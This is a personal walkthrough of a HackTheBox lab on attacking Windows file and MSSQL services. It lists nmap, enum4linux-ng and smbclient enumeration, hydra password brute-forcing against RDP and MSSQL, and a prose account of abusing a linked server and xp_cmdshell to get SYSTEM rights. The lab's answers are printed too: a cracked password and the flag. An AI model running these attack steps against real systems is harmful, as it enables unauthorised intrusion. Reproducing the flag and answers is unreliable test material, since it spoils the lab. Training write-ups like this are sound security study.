---
platform: hackthebox
difficulty: Hard
status: Completed
date: 2026-09-21
tags:
  - difficulty/hard
---
# HTB: Attacking Common Services - Hard

**Targets:** `10.129.203.10`  

---

## 01 - Scope
### Assignment:
The third server is another internal server used to manage files and working material, such as forms. In addition, a database is used on the server, the purpose of which we do not know
### Objectives:
- **Primary Goals:**
  - [x] What file can you retrieve that belongs to the user "simon"? (Format: filename.txt)
	`random.txt`
  - [x] Enumerate the target and find a password for the user Fiona. What is her password?
  `48Ns72!bns74@S84NNNSl`
  - [x] Once logged in, what other user can we compromise to gain admin privileges?
  `john`
  - [x] Submit the contents of the flag.txt file on the Administrator Desktop.
  `HTB{46u$!n9_l!nk3d_$3rv3r$}`


---

## 02 - Procedure

1. First I scanned the servers running services:
```bash
nmap -p- --min-rate 500 --max-retries 1 -v -n 10.129.203.10 > default-nmap
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921165018.png)

```bash
nmap -p 135,445,1433,3389  -sC -sV 10.129.203.10 > detailed-nmap
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921165122.png)

2. Since we are dealing with a windows server with open smb and rpc I continued with `enum4linux-ng`, which can provide a lot of useful information:
```bash
sudo enum4linux-ng 10.129.203.10 -A -oA /scanresults
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921165727.png)

```bash
sudo enum4linux-ng 10.129.203.10 -u 'hmvjeifb' -p '' -A -oA /scanresults
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921165916.png)

3. From the previous scan, we can see that the directory `Home` is accessible. I therefor connected to it...
```bash
smbclient //10.129.203.10/Home -U hmvjeifb%
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921170338.png)

4. and downloaded all accessible files:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921171142.png)

5. Afterwards I checked the "Password" files and tried to retrieve the password policy to make sure I don't lock the users when trying to bruteforce RDP:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921174339.png)
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921172219.png)

6. Since I didn't had access I decided to try it anyway (since this is only a lab).So I tried to bruteforce  `RDP` with each accounts:
```bash
hydra -l fiona -P IT/Fiona/creds.txt -f rdp://10.129.203.10
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921173620.png)

```bash
hydra -l john -P IT/John/secrets.txt -f rdp://10.129.203.10
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921173629.png)

```bash
hydra -l simon -P IT/Simon/random.txt  -f rdp://10.129.203.10
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921174544.png)


7. Since RDP didn't work, I tried to bruteforce  `MsSQL`:
```bash
hydra -l "fiona" -P IT/Fiona/creds.txt -s 1433 -vV -f 10.129.203.10 mssql
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921174423.png)

```bash
hydra -l "john" -P IT/John/secrets.txt -s 1433 -vV -f 10.129.203.10 mssql
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921174415.png)

```bash
hydra -l "simon" -P IT/Simon/random.txt -s 1433 -vV -f 10.129.203.10 mssql
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921174654.png)

8. I then checked the other two files of `john` to make sure I didn't miss anything. It seems like he is the DB-Admin, but I already figured that much, since one of his passwords is `TestingDB123`. What could be useful later is, that there is another `linked server` mentioned, which we can verify once we gain access:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921175100.png)

9. Now I bruteforced `fionas` SMB-Login:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921180641.png)

10. Which actually worked to login via RDP (I don't know, why the previous bruteforce wasn't successful). I checked the system and found:
```bash
xfreerdp /v:10.129.203.10 /u:fiona /p:'48Ns72!bns74@S84NNNSl' /dynamic-resolution /cert:ignore

```
- The Service-User for `MSSQL` is most likely `mssqlsvc`:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921181301.png)
- `Fiona` should be able to read the DB:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921181355.png)
- After manually browsing interesting folders I found an `Email` sent to the `Administrator`, which contained a flag, but unfortunately not the one we are looking for here: 
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921181916.png)

10. I then tried to login to the DB with the user `mssqlsvc` and Johns password list, which didn't work. So I connected with `Fiona`, since she should have read permission:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921191123.png)

```bash
python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py fiona@10.129.203.10 -windows-auth
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921191226.png)

11. I then checked other existing users and their permissions:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260921191857.png)

12. Since there was a note earlier mentioning a linked DB, I also checked that. And indeed there is a linked DB and `john` has admin access to it:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260922094531.png)

13. After some trial and error with the syntax, I managed to configure `xp_cmdshell` on the linked DB and gained `nt authority\system` rights:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260922101230.png)

14. And like that, the `flag.txt` was accessible:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020260922101738.png)
## 03 - Lesson Learned
1. `Enum4Linux-ng` can save a lot of time enumerating
2. `MSSQL` can have a big attack surface if configure poorly
